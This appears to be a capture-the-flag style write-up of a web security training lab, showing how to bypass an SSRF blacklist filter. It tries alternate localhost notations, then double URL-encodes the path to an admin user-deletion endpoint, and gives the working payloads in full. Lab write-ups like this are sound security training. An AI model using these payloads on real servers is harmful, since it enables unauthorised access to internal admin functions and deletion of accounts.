the parameter stockApi here is like lab-1 
`stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1`

decode it :
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1

let's try just the same as lab-1

stockApi=http://localhost/admin/delete?username=carlos

response : 

![image](https://user-images.githubusercontent.com/67979878/128211514-ccebfd38-fd0d-4704-a11f-3a7f2d83f1ba.png)

let's try different representation for the localhost 

ex: 2130706433, 017700000001 , 127.1 

it can access `stockApi=http://127.1/ ` however when try /admin it returns bad request .

``
By using double encoding it’s possible to bypass security filters that only decode user input once. 
The second decoding process is executed by the backend platform or modules that properly handle encoded data,
but don’t have the corresponding security checks in place.``

so let's check it :

`http://127.1/%61%64%6D%69%6E%2F%64%65%6C%65%74%65%3F%75%73%65%72%6E%61%6D%65%3D%63%61%72%6C%6F%73`

now encode it all 
`http%3a%2f%2f127.1%2f%2561%2564%256D%2569%256E%252F%2564%2565%256C%2565%2574%2565%253F%2575%2573%2565%2572%256E%2561%256D%2565%253D%2563%2561%2572%256C%256F%2573`

solved !
